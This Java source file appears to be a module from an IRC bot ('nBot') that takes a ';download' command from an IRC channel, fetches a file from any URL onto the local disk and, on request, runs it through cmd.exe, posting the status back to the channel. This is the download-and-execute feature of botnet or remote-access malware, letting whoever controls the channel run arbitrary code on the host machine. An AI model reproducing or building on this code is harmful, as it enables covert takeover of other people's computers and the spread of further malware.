
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Nathan
 */
public class Downloader implements Handler {

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";download")) {
            if (args.length < 4) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Invalid usage: ;download http://www.google.co.uk C:/index.html 1");
                return false;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Downloading "+args[1]+" to "+args[2]+" running "+args[3]);
            try {
                download(args[1], args[2]);
                if(args[3].equals("1")) {
                    Runtime.getRuntime().exec(new String[] { "cmd.exe", "/C", args[2] });
                }
            } catch(Exception e) {
                e.printStackTrace();
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " File could not be downloaded! Reason: "+e.toString());
                return false;
            }
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " File was downloaded sucsessfully!");
            return true;
        }
        return false;
    }

    public static void download(String url, String local)
            throws IOException {
        File file = new File(local);
        if (file.exists()) {
            file.delete();
        }
        URL _url = new URL(url);
        OutputStream out = new BufferedOutputStream(new FileOutputStream(local));
        URLConnection conn = _url.openConnection();
        InputStream in = conn.getInputStream();
        byte[] buffer = new byte[1024];
        int read;
        while ((read = in.read(buffer)) != -1) {
            out.write(buffer, 0, read);
        }
        out.flush();
        in.close();
        out.close();
        IRC.sendMessage(Config.channel, "Downloader finished, downloaded "+Misc.size(file.length()));
    }
}
